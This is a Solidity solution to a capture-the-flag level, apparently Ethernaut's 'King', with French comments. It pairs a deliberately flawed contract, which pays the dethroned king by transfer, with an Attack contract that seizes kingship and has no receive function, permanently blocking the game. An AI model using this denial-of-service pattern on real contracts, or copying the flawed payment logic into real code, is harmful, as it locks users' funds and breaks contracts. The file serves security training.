// The contract below represents a very simple game: whoever sends it an amount of ether
// that is larger than
//  the current prize becomes the new king. On such an event,
// the overthrown king gets paid the new prize, making a bit of ether in the process!
// As ponzi as it gets xD

// Such a fun game. Your goal is to break it.

// When you submit the instance back to the level, the level is going to reclaim kingship.
//  You will beat the level if you can avoid such a self proclamation.

//But du jeu : Briser le contrat en empêchant qu'un nouveau roi soit proclamé.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        //Pour mesure de sécurité pour empêcher une attaque de type DoS on devait
        //verifier si le msg.sender n'est pas un contract en faisant if msg.sender.code.length >0 revert()
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        //S'il s'agit d'un contract sans implémentation du fallback ou du
        //receive alors automatiquement on ne pourra pas renvoyer des
        //ethers au king et le jeu reste bloqué
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

//Je vais utiliser ce smart contract pour causer une déni de service au contract King

contract Attack {
    King kg;

    constructor(address king) {
        kg = King(payable(king));
    }

    function attack() public {
        //L'adresse du contract Attack devient le msg.sender et comme
        //Je n'ai as impléménté de fallback ou receive il ne pourra pas recevoir des éthers en retour
        //Et j'aurai effectué une attaque de type DoS sur le contract King
        //Il faut que le contract Attack est le msg.value comme balance pour qu'il effectuer l'attaque
        address(kg).call{value: 2 ether}("");
    }
}
